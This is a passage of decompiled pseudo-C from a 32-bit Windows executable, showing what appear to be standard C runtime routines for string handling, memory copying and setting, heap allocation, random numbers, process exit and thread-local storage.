            if(_t34 == 0) {
                break;
            }
            if((_t36 & 3) != 0) {
                continue;
            } else {
                while(1) {
L4:
                    _t24 =  *_t36 ^ -1 ^ 2130640639 +  *_t36;
                    _t36 = _t36 + 4;
                    if((_t24 & -2130640640) == 0) {
                        continue;
                    }
L5:
                    _t25 =  *(_t36 - 4);
                    if(_t25 == 0) {
                        return _t36 - 4 - _a4;
                    } else {
                        if(_t25 == 0) {
                            return _t36 - 3 - _a4;
                        } else {
                            if((_t25 & 16711680) == 0) {
                                return _t36 - 2 - _a4;
                            } else {
                                if((_t25 & -16777216) == 0) {
                                    goto L10;
                                } else {
                                    do {
                                        goto L4;
                                    } while((_t24 & -2130640640) == 0);
                                    goto L5;
                                }
                            }
                        }
                    }
                    goto L14;
                }
            }
            goto L14;
        }
L10:
        return _t36 - 1 - _a4;
    }
L14:
}

signed int L0040A460(
    _unknown_ __eax,                       // r0
    signed int _a4,                        // _cfa_4
    signed int _a8,                        // _cfa_8
    unsigned int _a12                      // _cfa_c
)
{
    _unknown_ __ebx;                       // r1
    signed int __edi;                      // r4
    _unknown_ __esi;                       // r5
    signed int _t23;                       // _t23
    signed int _t28;                       // _t28
    _unknown_ _t29;                        // _t29
    signed int _t30;                       // _t30
    unsigned int _t31;                     // _t31
    unsigned int _t32;                     // _t32
    unsigned int _t33;                     // _t33
    signed int _t36;                       // _t36
    _unknown_ _t40;                        // _t40
    signed int _t41;                       // _t41

    _t31 = _a12;
    if(_t31 == 0) {
L19:
        return _a4;
    } else {
        _push(_t40);
        _push(_t29);
        _t30 = _t31;
        _t41 = _a8;
        __edi = _a4;
        if((_t41 & 3) != 0) {
            while(1) {
                _t23 =  *_t41;
                _t41 = _t41 + 1;
                 *__edi = _t23;
                __edi = __edi + 1;
                _t31 = _t31 - 1;
                if(_t31 == 0) {
                    goto L11;
                }
                if(_t23 == 0) {
                    if((__edi & 3) == 0) {
L15:
                        _t30 = _t31;
                        _t32 = _t31 >> 2;
                        if(_t32 != 0) {
                            goto L31;
                        } else {
                            goto L16;
                        }
                    } else {
                        while(1) {
                             *__edi = _t23;
                            __edi = __edi + 1;
                            _t31 = _t31 - 1;
                            if(_t31 == 0) {
                                goto L34;
                            }
                            if((__edi & 3) != 0) {
                                continue;
                            } else {
                                goto L15;
                            }
                            goto L35;
                        }
                        goto L34;
                    }
                } else {
                    if((_t41 & 3) != 0) {
                        continue;
                    } else {
                        _t30 = _t31;
                        _t33 = _t31 >> 2;
                        if(_t33 != 0) {
                            goto L21;
                        } else {
                            goto L8;
                        }
                    }
                }
                goto L35;
            }
            goto L11;
        } else {
            _t33 = _t31 >> 2;
            if(_t33 != 0) {
                do {
L21:
                    _t28 =  *_t41 ^ -1 ^ 2130640639 +  *_t41;
                    _t36 =  *_t41;
                    _t41 = _t41 + 4;
                    if((_t28 & -2130640640) == 0) {
                        goto L20;
                    } else {
                        if(_t36 == 0) {
                             *__edi = 0;
                            goto L30;
                        } else {
                            if(_t36 == 0) {
                                 *__edi = _t36 & 255;
                                goto L30;
                            } else {
                                if((_t36 & 16711680) == 0) {
                                     *__edi = _t36 & 65535;
                                    goto L30;
                                } else {
                                    if((_t36 & -16777216) != 0) {
                                        goto L20;
                                    } else {
                                         *__edi = _t36;
L30:
                                        __edi = __edi + 4;
                                        _t23 = 0;
                                        _t32 = _t33 - 1;
                                        if(_t32 != 0) {
L31:
                                            _t23 = 0;
                                            do {
                                                 *__edi = _t23;
                                                __edi = __edi + 4;
                                                _t32 = _t32 - 1;
                                            } while(_t32 != 0);
                                        }
                                        _t30 = _t30 & 3;
                                        if(_t30 != 0) {
                                            goto L16;
                                        } else {
L34:
                                            _pop(__ebx);
                                            _pop(__esi);
                                            return _a4;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    goto L35;
L20:
                     *__edi = _t36;
                    __edi = __edi + 4;
                    _t33 = _t33 - 1;
                } while(_t33 != 0);
L8:
                _t30 = _t30 & 3;
                if(_t30 == 0) {
                    goto L11;
                } else {
                    goto L9;
                }
            } else {
                while(1) {
L9:
                    _t23 =  *_t41;
                    _t41 = _t41 + 1;
                     *__edi = _t23;
                    __edi = __edi + 1;
                    if(_t23 == 0) {
                        break;
                    }
                    _t30 = _t30 - 1;
                    if(_t30 != 0) {
                        continue;
                    } else {
L11:
                        _pop(__ebx);
                        _pop(__esi);
                        return _a4;
                    }
                    goto L35;
                }
L17:
                _t30 = _t30 - 1;
                if(_t30 != 0) {
L16:
                     *__edi = _t23;
                    __edi = __edi + 1;
                    goto L17;
                }
                _pop(__ebx);
                _pop(__esi);
                goto L19;
            }
        }
    }
L35:
}

L0040A560(
    _unknown_ __eax,                       // r0
    _unknown_ __ecx,                       // r2
    char _a4                               // _cfa_4
)
{
    _unknown_ _t7;                         // _t7
    _unknown_ _t8;                         // _t8
    intOrPtr _t9;                          // _t9
    char* _t11;                            // _t11

    _t7 = __eax;
    _push(__ecx);
    _t11 =  &_a4;
    if(__eax >= 4096) {
        do {
            _t11 = _t11 - 4096;
            _t7 = _t7 - 4096;
        } while(_t7 >= 4096);
    }
    _t8 = __esp;
    __esp = _t11 - _t7;
    _t9 =  *((intOrPtr*)(_t8 + 4));
    _push(_t9);
    return _t9;
}

signed int L0040A590(
    signed int _a4,                        // _cfa_4
    signed int _a8,                        // _cfa_8
    signed int _a12                        // _cfa_c
)
{
    _unknown_ __edi;                       // r4
    signed int _t9;                        // _t9
    signed int _t14;                       // _t14
    signed int _t16;                       // _t16
    unsigned int _t19;                     // _t19
    signed int _t20;                       // _t20
    _unknown_ _t22;                        // _t22
    signed int _t23;                       // _t23

    __edx = _a12;
    _t14 = _a4;
    if(__edx == 0) {
        return _a4;
    } else {
        _t9 = _a8;
        _push(_t22);
        _t23 = _t14;
        if(__edx < 4) {
L7:
             *_t23 = _t9;
            _t23 = _t23 + 1;
            __edx = __edx - 1;
        } else {
            _t16 =  ~_t14 & 3;
            if(_t16 != 0) {
                __edx = __edx - _t16;
                do {
                     *_t23 = _t9;
                    _t23 = _t23 + 1;
                    _t16 = _t16 - 1;
                } while(_t16 != 0);
            }
            _t9 = ((_t9 << 8) + _t9 << 16) + (_t9 << 8) + _t9;
            _t19 = __edx;
            __edx = __edx & 3;
            _t20 = _t19 >> 2;
            if(_t20 == 0) {
                goto L7;
            } else {
                _push(_t20 << 2);
                _push(_t9);
                _push(_t23);
                memset();
                __esp = __esp + 12;
                _t23 = _t23 + _t20;
                if(__edx != 0) {
                    do {
                        goto L7;
                    } while(__edx != 0);
                }
            }
        }
        _pop(__edi);
        return _a4;
    }
}

signed int L0040A5F0(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    _unknown_ _a12                         // _cfa_c
)
{
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t12;                       // _t12
    _unknown_ _t18;                        // _t18

    asm("jecxz 0x28");
    asm("repne scasb");
    asm("repe cmpsb");
    _t12 = 0;
    _t18 =  *((intOrPtr*)(_a8 - 1)) -  *((intOrPtr*)(_a4 - 1));
    if(_t18 > 0) {
L3:
        _t12 =  !_t12;
    } else {
        if(_t18 != 0) {
            _t12 = 0xfffffffffffffffe;
            goto L3;
        }
    }
    return _t12;
}

signed int L0040A760(
    signed int _a4,                        // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    signed int _a12                        // _cfa_c
)
{
    char* __edi;                           // r4
    intOrPtr* __esi;                       // r5
    _unknown_ _t104;                       // _t104
    signed int _t105;                      // _t105
    signed int _t115;                      // _t115
    signed int _t116;                      // _t116
    signed int _t118;                      // _t118
    signed int _t120;                      // _t120
    signed int _t121;                      // _t121
    signed int _t122;                      // _t122
    signed int _t123;                      // _t123
    signed int _t125;                      // _t125
    signed int _t126;                      // _t126
    signed int _t129;                      // _t129
    intOrPtr _t131;                        // _t131
    _unknown_ _t133;                       // _t133

    _t131 = _a8;
    _t119 = _a12;
    _t126 = _a4;
    _t122 = _t119;
    _t104 = _t119 + _t131;
    if(_t126 <= _t131 || _t126 >= _t104) {
        if((_t126 & 3) != 0) {
            _t105 = _t126;
            _t123 = 3;
            _t120 = _t119 - 4;
            if(_t120 < 0) {
                goto ( *((intOrPtr*)(_t120 * 4 +  &M0040A8B8)));
            }
            _t115 = _t105 & 3;
            _t120 = _t120 + _t115;
            goto ( *((intOrPtr*)(_t115 * 4 +  &M0040A7C0)));
        }
        _t120 = _t119 >> 2;
        _t123 = _t122 & 3;
        if(_t120 < 8) {
            switch( *((intOrPtr*)(_t120 * 4 +  &M0040A83C))) {
                case 0:
L16:
                    goto ( *((intOrPtr*)(_t123 * 4 +  &M0040A8A8)));
                case 1:
L15:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 4)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 4));
                    goto L16;
                case 2:
L14:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 8)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 8));
                    goto L15;
                case 3:
L13:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 12)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 12));
                    goto L14;
                case 4:
L12:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 16)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 16));
                    goto L13;
                case 5:
L11:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 20)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 20));
                    goto L12;
                case 6:
L10:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 24)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 24));
                    goto L11;
                case 7:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 28)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 28));
                    goto L10;
            }
        }
        _push(_t120 << 2);
        _push(_t131);
        _push(_t126);
        memcpy();
        __esp = __esp + 12;
        _t126 = _t131 + _t120 + _t120;
        _t119 = 0;
        switch( *((intOrPtr*)(_t123 * 4 +  &M0040A8A8))) {
            case 0:
                return _a4;
                goto L33;
            case 1:
                 *__edi =  *__esi;
                return _a4;
                goto L33;
            case 2:
                 *__edi =  *__esi;
                __edi[1] = __esi[0];
                return _a4;
                goto L33;
            case 3:
                 *__edi =  *__esi;
                __edi[1] = __esi[0];
                __edi[2] = __esi[0];
                return _a4;
                goto L33;
        }
    } else {
        _t133 = _t119 + _t131 - 4;
        _t129 = _t119 + _t126 - 4;
        if((_t129 & 3) != 0) {
            _t116 = _t129;
            if(_t119 < 4) {
                goto ( *((intOrPtr*)(_t119 * 4 +  &M0040AA40)));
            }
            _t118 = _t116 & 3;
            _t119 = _t119 - _t118;
            goto ( *((intOrPtr*)(_t118 * 4 +  &M0040A948)));
        }
        _t121 = _t119 >> 2;
        _t125 = _t122 & 3;
        if(_t121 < 8) {
            _t119 =  ~_t121;
            goto  *((intOrPtr*)( ~_t121 * 4 +  &M0040A9F0))[L28]goto ( *((intOrPtr*)( ~_t121 * 4 +  &M0040A9F0)));
            goto ( *((intOrPtr*)(0xc +  &M0040AA40)));
        }
        asm("std");
        _push(_t121 << 2);
        _push(_t133);
        _push(_t129);
        memcpy();
        __esp = __esp + 12;
        _t129 = _t133 + _t121 + _t121;
        _t121 = 0;
        asm("cld");
        switch( *((intOrPtr*)(_t125 * 4 +  &M0040AA40))) {
            case 0:
                return _a4;
                goto L33;
            case 1:
                __edi[3] = __esi[0];
                return _a4;
                goto L33;
            case 2:
                __edi[3] = __esi[0];
                __edi[2] = __esi[0];
                return _a4;
                goto L33;
            case 3:
                __edi[3] = __esi[0];
                __edi[2] = __esi[0];
                __edi[1] = __esi[0];
                return _a4;
                goto L33;
        }
    }
L33:
}

L0040AA95(
    intOrPtr _a4                           // _cfa_4
)
{
    _push(1);
    _push(_a4);
    __eax = L0040AFE8();
    _pop(__ecx);
    _pop(__ecx);
    return __eax;
}

L0040AAB0(
    signed int _a4,                        // _cfa_4
    intOrPtr* _a8                          // _cfa_8
)
{
    signed int _t13;                       // _t13
    unsigned int _t18;                     // _t18

    __edx = _a4;
    __ecx = _a8;
    if((__edx & 3) != 0) {
        if((__edx & 1) == 0) {
L16:
            _t13 =  *__edx;
            __edx = __edx + 2;
            if(_t13 !=  *__ecx) {
                goto L11;
            } else {
                _t13 = _t13;
                if(_t13 == 0) {
                    goto L10;
                } else {
                    if(_t13 != __ecx[0]) {
                        goto L11;
                    } else {
                        if(_t13 == 0) {
                            goto L10;
                        } else {
                            __ecx = __ecx + 2;
                            goto L1;
                        }
                    }
                }
            }
        } else {
            _t13 =  *__edx;
            __edx = __edx + 1;
            if(_t13 !=  *__ecx) {
                goto L11;
            } else {
                __ecx = __ecx + 1;
                if(_t13 == 0) {
                    goto L10;
                } else {
                    if((__edx & 2) == 0) {
                        goto L1;
                    } else {
                        goto L16;
                    }
                }
            }
        }
    } else {
        while(1) {
L1:
            _t13 =  *__edx;
            if(_t13 !=  *__ecx) {
                break;
            }
            _t13 = _t13;
            if(_t13 == 0) {
L10:
                return 0;
            } else {
                if(_t13 != __ecx[0]) {
                    break;
                } else {
                    _t18 = _t13;
                    if(_t18 == 0) {
                        goto L10;
                    } else {
                        _t13 = _t18 >> 16;
                        if(_t13 != __ecx[0]) {
                            break;
                        } else {
                            _t13 = _t13;
                            if(_t13 == 0) {
                                goto L10;
                            } else {
                                if(_t13 != __ecx[0]) {
                                    break;
                                } else {
                                    __ecx = __ecx + 4;
                                    __edx = __edx + 4;
                                    if(_t13 != 0) {
                                        continue;
                                    } else {
                                        goto L10;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            goto L21;
        }
L11:
        asm("sbb eax, eax");
        return (_t13 << 1) + 1;
    }
L21:
}

L0040AB34(
    intOrPtr _a4                           // _cfa_4
)
{
    return L0040B062(_a4);
}

signed int L0040ACB0(
    signed int __ecx,                      // r2
    signed int _a4,                        // _cfa_4
    _unknown_ _a8                          // _cfa_8
)
{
    signed int __ebx;                      // r1
    signed int __edi;                      // r4
    signed int __esi;                      // r5

    __ecx = __ecx;
    _push(__ebx);
    __ebx = 0;
    __eax = 0 << 8;
    __edx = _a4;
    if((__edx & 3) == 0) {
L6:
        __ebx = __ebx | __eax;
        _push(__edi);
        __eax = __ebx;
        __ebx = __ebx << 16;
        _push(__esi);
        __ebx = __ebx | __eax;
        while(1) {
L7:
            __ecx =  *__edx;
            __edi = 2130640639;
            __eax = __ecx;
            __esi = 2130640639;
            __ecx = __ecx ^ __ebx;
            __esi = 2130640639 + __eax;
            __edi = 2130640639 + __ecx;
            __ecx = __ecx ^ -1;
            __eax = __eax ^ -1;
            __ecx = __ecx ^ __edi;
            __eax = __eax ^ 2130640639;
            __edx = __edx + 4;
            if(__ecx == 0) {
                break;
            }
            __eax =  *(__edx - 4);
            if(__al == __bl) {
                __eax = __edx - 4;
                _pop(__esi);
                _pop(__edi);
                _pop(__ebx);
                return __edx - 4;
            } else {
                if(__al == 0) {
L11:
                    _pop(__esi);
                    _pop(__edi);
                    goto L12;
                } else {
                    if(__ah == __bl) {
                        __eax = __edx - 3;
                        _pop(__esi);
                        _pop(__edi);
                        _pop(__ebx);
                        return __edx - 3;
                    } else {
                        if(__ah == 0) {
                            goto L11;
                        } else {
                            if(__al == __bl) {
                                __eax = __edx - 2;
                                _pop(__esi);
                                _pop(__edi);
                                _pop(__ebx);
                                return __edx - 2;
                            } else {
                                if(__al == 0) {
                                    goto L11;
                                } else {
                                    if(__ah == __bl) {
                                        _pop(__esi);
                                        _pop(__edi);
                                        __eax = __edx - 1;
                                        _pop(__ebx);
                                        return __edx - 1;
                                    } else {
                                        if(__ah == 0) {
                                            goto L11;
                                        } else {
                                            continue;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            goto L26;
        }
        __eax = __eax & -2130640640;
        if(__eax == 0 || __eax == 0 && __esi != 0) {
            goto L7;
        } else {
            goto L11;
        }
    } else {
        while(1) {
            __cl =  *__edx;
            __edx = __edx + 1;
            if(__cl == __bl) {
                _pop(__ebx);
                return __edx - 1;
            }
            if(__cl == 0) {
L12:
                _pop(__ebx);
                __eax = 0;
                return 0;
            } else {
                if((__edx & 3) != 0) {
                    continue;
                } else {
                    goto L6;
                }
            }
            goto L26;
        }
    }
L26:
}

L0040AD6C(
    intOrPtr _a4                           // _cfa_4
)
{
    _unknown_ _t3;                         // _t3
    _unknown_ _t4;                         // _t4

    _t4 = L0040B458(_t3);
     *((intOrPtr*)(_t4 + 20)) = _a4;
    return _t4;
}

signed int L0040AD79()
{
    _unknown_ _t3;                         // _t3
    _unknown_ _t4;                         // _t4
    unsigned int _t10;                     // _t10

    _t4 = L0040B458(_t3);
    _t10 = 2531011 +  *(_t4 + 20) * 214013;
     *(_t4 + 20) = _t10;
    return _t10 >> 16 & 32767;
}

L0040ADA0(
    intOrPtr* _a4,                         // _cfa_4
    intOrPtr* _a8                          // _cfa_8
)
{
    intOrPtr* __esi;                       // r5
    intOrPtr _t8;                          // _t8

    _push(0);
    _push(0);
    _push(0);
    _push(0);
    _push(0);
    _push(0);
    _push(0);
    _push(0);
    __edx = _a8;
    while( *__edx != 0) {
        __edx = __edx + 1;
        asm("bts [esp], eax");
    }
    __esi = _a4;
    while(1) {
        _t8 =  *__esi;
        if(_t8 == 0) {
            break;
        }
        __esi = __esi + 1;
        asm("bt [esp], eax");
        if(__esi >= 0) {
            continue;
        } else {
            _t8 = __esi - 1;
        }
        break;
    }
    __esp = __esp + 32;
    return _t8;
}

signed int L0040ADE0(
    _unknown_ __ecx,                       // r2
    signed int _a4,                        // _cfa_4
    signed char _a8,                       // _cfa_8
    intOrPtr _a12                          // _cfa_c
)
{
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    intOrPtr _t13;                         // _t13
    _unknown_ _t14;                        // _t14
    signed char _t20;                      // _t20
    signed char _t25;                      // _t25
    signed int _t28;                       // _t28
    signed char _t33;                      // _t33
    unsigned int _t34;                     // _t34
    signed char _t36;                      // _t36
    signed char _t38;                      // _t38
    _unknown_ _t40;                        // _t40

    _t13 = _a12;
    if(_t13 == 0) {
L11:
        return _t13;
    } else {
        __edx = _a4;
        _t20 = _a8;
        if((__edx & 3) == 0) {
L5:
            _t14 = _t13 - 4;
            if(_t14 < 0) {
L8:
                _t13 = _t14 + 4;
                if(_t13 == 0) {
                    goto L11;
                } else {
                    while(1) {
                        _t25 =  *__edx;
                        __edx = __edx + 1;
                        if((_t25 ^ _t20) == 0) {
                            goto L20;
                        }
                        _t13 = _t13 - 1;
                        if(_t13 != 0) {
                            continue;
                        } else {
                            goto L11;
                        }
                        goto L24;
                    }
                    goto L20;
                }
            } else {
                _push(_t40);
                _t20 = ((_t20 << 8) + _t20 << 16) + (_t20 << 8) + _t20;
                do {
                    _t28 =  *__edx ^ _t20;
                    __edx = __edx + 4;
                    if(((_t28 ^ -1 ^ 2130640639 + _t28) & -2130640640) == 0) {
                        goto L12;
                    } else {
                        _t33 =  *(__edx - 4) ^ _t20;
                        if(_t33 == 0) {
                            _pop(__edi);
                            return __edx - 4;
                        } else {
                            _t34 = _t33 ^ _t20;
                            if(_t34 == 0) {
                                _pop(__edi);
                                return __edx - 3;
                            } else {
                                _t36 = _t34 >> 16 ^ _t20;
                                if(_t36 == 0) {
                                    _pop(__edi);
                                    return __edx - 2;
                                } else {
                                    if((_t36 ^ _t20) == 0) {
                                        _pop(__edi);
                                        goto L20;
                                    } else {
                                        goto L12;
                                    }
                                }
                            }
                        }
                    }
                    goto L24;
L12:
                    _t14 = _t14 - 4;
                } while(_t14 >= 0);
                _pop(__edi);
                goto L8;
            }
        } else {
            while(1) {
                _t38 =  *__edx;
                __edx = __edx + 1;
                if((_t38 ^ _t20) == 0) {
                    break;
                }
                _t13 = _t13 - 1;
                if(_t13 == 0) {
                    goto L11;
                } else {
                    if((__edx & 3) != 0) {
                        continue;
                    } else {
                        goto L5;
                    }
                }
                goto L24;
            }
L20:
            return __edx - 1;
        }
    }
L24:
}

L0040AF8D(
    intOrPtr _a4                           // _cfa_4
)
{
    if( *4302896 == 1) {
        L0040BCBF();
    }
    _push(_a4);
    __eax = L0040BCF8(__edi);
    _push(255);
     *4269216();
    _pop(__ecx);
    _pop(__ecx);
    return __eax;
}

L0040AFB2(
    intOrPtr _a4                           // _cfa_4
)
{
    if( *4302896 == 1) {
        L0040BCBF();
    }
    __eax = L0040BCF8(__edi, _a4);
    _push(255);
    __imp__ExitProcess();
    return __eax;
}

L0040AFD6(
    intOrPtr _a4                           // _cfa_4
)
{
    _push( *4303236);
    _push(_a4);
    __eax = L0040AFE8();
    _pop(__ecx);
    _pop(__ecx);
    return __eax;
}

L0040AFE8(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    _unknown_ _t6;                         // _t6

    if(_a4 > -32) {
L4:
        return 0;
    } else {
        goto L1;
    }
    while(1) {
L1:
        _t6 = L0040B014(_a4);
        if(_t6 != 0 || _a8 == _t6) {
            break;
        }
        if(L0040BE4B(_a4) != 0) {
            continue;
        }
        goto L4;
    }
    return _t6;
}

L0040B014(
    intOrPtr _a4                           // _cfa_4
)
{
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t2;                         // _t2
    _unknown_ _t4;                         // _t4
    intOrPtr _t6;                          // _t6

    _t6 = _a4;
    if(_t6 >  *4270280) {
L3:
        if(_t6 == 0) {
            _push(1);
            _pop(__esi);
        }
        _push(_t6 + 15 & -16);
        _push(0);
        _push( *4304320);
        __imp__HeapAlloc();
        return _t2;
    }
    L0040BE8F();
    _push(_t6);
    _t4 = L0040C299();
    _push(9);
    __edi = _t4;
    _t2 = L0040BEF0(9);
    __esp = __esp + 12;
    if(__edi == 0) {
        goto L3;
    }
    return __edi;
}

L0040B062(
    intOrPtr _a4                           // _cfa_4
)
{
    intOrPtr __esi;                        // r5
    _unknown_ _t2;                         // _t2
    _unknown_ _t4;                         // _t4
    _unknown_ _t5;                         // _t5
    _unknown_ _t7;                         // _t7

    __esi = _a4;
    if(__esi == 0) {
        return _t2;
    } else {
        _push(9);
        L0040BE8F();
        _t4 = L0040BF43(__esi);
        if(_t4 == 0) {
            _t5 = L0040BEF0(9);
            _push(__esi);
            _push(0);
            _push( *4304320);
            __imp__HeapFree();
            return _t5;
        }
        _push(__esi);
        _push(_t4);
        L0040BF6E();
        _t7 = L0040BEF0(9);
        __esp = __esp + 8;
        return _t7;
    }
}

signed int L0040B0AA(
    _unknown_ __ecx,                       // r2
    _unknown_ __esi,                       // r5
    signed int _a4,                        // _cfa_4
    signed short _a6,                      // _cfa_6
    signed int _a8                         // _cfa_8
)
{
    char _v6;                              // _cfa_fffffffa
    char _v7;                              // _cfa_fffffff9
    char _v8;                              // _cfa_fffffff8
    signed int _t21;                       // _t21
    _unknown_ _t23;                        // _t23
    signed int _t24;                       // _t24
    signed char _t29;                      // _t29

    _push(__ecx);
    _t21 = _a4;
    if(_t21 + 1 > 256) {
        _push(__esi);
        _t29 = _t21 >> 8;
        _pop(__esi);
        if(( *( *4269224 + 1 + (_t29 & 255) * 2) & 128) == 0) {
            _v7 = 0;
            _v8 = _t21;
            _push(1);
        } else {
            _v6 = 0;
            _v8 = _t29;
            _v7 = _t21;
            _push(2);
        }
        _pop(__eax);
        _t23 = L0040CA44(1,  &_v8, _t21,  &_a6, 0, 0, 1);
        if(_t23 != 0) {
            _t24 = _a6 & 65535;
            goto L8;
        } else {
            return _t23;
        }
    } else {
        _t24 =  *( *4269224 + _t21 * 2) & 65535;
L8:
        return _t24 & _a8;
    }
}

L0040B154()
{
    __eax =  *4304628;
    if(__eax != 0) {
         *__eax();
    }
    _push(4259868);
    _push(4259856);
    L0040B25A();
    L0040B25A(4259840, 4259852);
    __esp = __esp + 8;
}

L0040B181(
    intOrPtr _a4                           // _cfa_4
)
{
    L0040B1A3(_a4, 0, 0);
    return __eax;
}

L0040B1A3(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    char _a12                              // _cfa_c
)
{
    _unknown_ __ebx;                       // r1
    intOrPtr __edi;                        // r4
    _unknown_ _t6;                         // _t6
    char _t7;                              // _t7
    _unknown_ _t8;                         // _t8
    intOrPtr* _t9;                         // _t9

    __eax = L0040B248();
    _push(1);
    _pop(__edi);
    if( *4302964 == __edi) {
        _push(_a4);
        __imp__GetCurrentProcess();
        _push(__eax);
        __imp__TerminateProcess();
    }
    _push(_t6);
    _t7 = _a12;
     *4302960 = __edi;
     *4302956 = _t7;
    if(_a8 != 0) {
L10:
        _push(4259884);
        _push(4259880);
        L0040B25A();
        _pop(__ecx);
        _pop(__ecx);
        _pop(__ebx);
        if(_t7 == 0) {
            _push(_a4);
             *4302964 = __edi;
            __imp__ExitProcess();
            return;
        } else {
            L0040B251();
            return;
        }
    } else {
        __eax =  *4304624;
        if(__eax == 0) {
L9:
            _push(4259876);
            _push(4259872);
            L0040B25A();
            _pop(__ecx);
            _pop(__ecx);
            goto L10;
        }
        __ecx =  *4304620;
        _push(_t8);
        _t9 =  *4304620 - 4;
        if(_t9 < __eax) {
L8:
            _pop(__esi);
            goto L9;
        } else {
            goto L5;
        }
        do {
L5:
            __eax =  *_t9;
            if(__eax != 0) {
                 *__eax();
            }
            _t9 = _t9 - 4;
        } while(_t9 >=  *4304624);
        goto L8;
    }
}

L0040B248()
{
    return L0040BE8F(13);
}

L0040B251()
{
    return L0040BEF0(13);
}

L0040B25A(
    intOrPtr* _a4,                         // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    intOrPtr* __esi;                       // r5

    __esi = _a4;
    while(__esi < _a8) {
        __eax =  *__esi;
        if(__eax != 0) {
             *__eax();
        }
        __esi = __esi + 4;
    }
}

L0040B3F1(
    intOrPtr __eax                         // r0
)
{
    intOrPtr* __esi;                       // r5
    intOrPtr* _t5;                         // _t5
    intOrPtr _t6;                          // _t6

    L0040BE66();
    __imp__TlsAlloc();
     *4269760 = __eax;
    if(__eax == -1) {
L4:
        return 0;
    } else {
        _push(116);
        _push(1);
        _t5 = L0040CB8D();
        __esi = _t5;
        _pop(__ecx);
        _pop(__ecx);
        if(__esi == 0) {
            goto L4;
        } else {
            _push(__esi);
            _push( *4269760);
            __imp__TlsSetValue();
            if(_t5 == 0) {
                goto L4;
            } else {
                _t6 = L0040B445(__esi);
                __imp__GetCurrentThreadId();
                 *(__esi + 4) =  *(__esi + 4) | -1;
                _push(1);
                 *__esi = _t6;
                _pop(__eax);
                return _t6;
            }
        }
    }
}

L0040B445(
    intOrPtr _a4                           // _cfa_4
)
{
    __eax = _a4;
     *((intOrPtr*)(__eax + 80)) = 4269768;
     *((intOrPtr*)(__eax + 20)) = 1;
    return __eax;
}

L0040B458(
    intOrPtr* __eax                        // r0
)
{
    intOrPtr* __esi;                       // r5
    intOrPtr* _t5;                         // _t5
    intOrPtr _t7;                          // _t7

    __imp__GetLastError();
    _push( *4269760);
    __imp__TlsGetValue();
    __esi = __eax;
    if(__eax == 0) {
        _push(116);
        _push(1);
        _t5 = L0040CB8D();
        __esi = _t5;
        _pop(__ecx);
        _pop(__ecx);
        if(__esi == 0) {
L4:
            L0040AF8D(16);
        } else {
            _push(__esi);
            _push( *4269760);
            __imp__TlsSetValue();
            if(_t5 == 0) {
                goto L4;
            } else {
                _t7 = L0040B445(__esi);
                __imp__GetCurrentThreadId();
                 *(__esi + 4) =  *(__esi + 4) | -1;
                 *__esi = _t7;
            }
        }
    }
    _push(__eax);
    __imp__SetLastError();
    return __esi;
}

L0040B4BF(
    _unknown_ __edi,                       // r4
    intOrPtr* _a4,                         // _cfa_4
    signed int _a8                         // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    _unknown_ __ebx;                       // r1
    _unknown_ __ecx;                       // r2
    _unknown_ __esi;                       // r5
    intOrPtr* _t35;                        // _t35
    signed int _t37;                       // _t37
    _unknown_ _t38;                        // _t38
    intOrPtr* _t39;                        // _t39
    _unknown_ _t42;                        // _t42
    intOrPtr _t45;                         // _t45
    signed int _t49;                       // _t49
    intOrPtr _t51;                         // _t51
    _unknown_ _t54;                        // _t54
    _unknown_ _t55;                        // _t55

    _push(_t42);
    _push(_t39);
    _push(_t54);
    _t55 = L0040B458(_t35);
    _push( *((intOrPtr*)(_t55 + 80)));
    _push(_a4);
    _t37 = L0040B5FD();
    _pop(__ecx);
    _pop(__ecx);
    if(_t37 == 0) {
L28:
        _push(_a8);
        __imp__UnhandledExceptionFilter();
L29:
        _pop(__esi);
        _pop(__ebx);
        return;
    }
    _t39 =  *((intOrPtr*)(_t37 + 8));
    _a4 = _t39;
    if(_t39 == 0) {
        goto L28;
    }
    if(_t39 != 5) {
        if(_t39 == 1) {
L27:
            _t37 = _t37 | -1;
            goto L29;
        }
        _v8 =  *(_t55 + 84);
         *(_t55 + 84) = _a8;
        _t45 =  *((intOrPtr*)(_t37 + 4));
        if(_t45 != 8) {
             *((intOrPtr*)(_t37 + 8)) = 0;
            _push(_t45);
             *_t39();
            _pop(__ecx);
L26:
            _t37 = _v8;
             *(_t55 + 84) = _t37;
            goto L27;
        }
        __edx =  *4269888;
        _push(__edi);
        if(__edx >=  *4269892 + __edx) {
L10:
            _t38 =  *_t37;
            _t51 =  *((intOrPtr*)(_t55 + 88));
            if(_t38 != -1073741682) {
                if(_t38 != -1073741680) {
                    if(_t38 != -1073741679) {
                        if(_t38 != -1073741677) {
                            if(_t38 != -1073741683) {
                                if(_t38 != -1073741681) {
                                    if(_t38 == -1073741678) {
                                         *((intOrPtr*)(_t55 + 88)) = 138;
                                    }
                                } else {
                                     *((intOrPtr*)(_t55 + 88)) = 134;
                                }
                            } else {
                                 *((intOrPtr*)(_t55 + 88)) = 130;
                            }
                        } else {
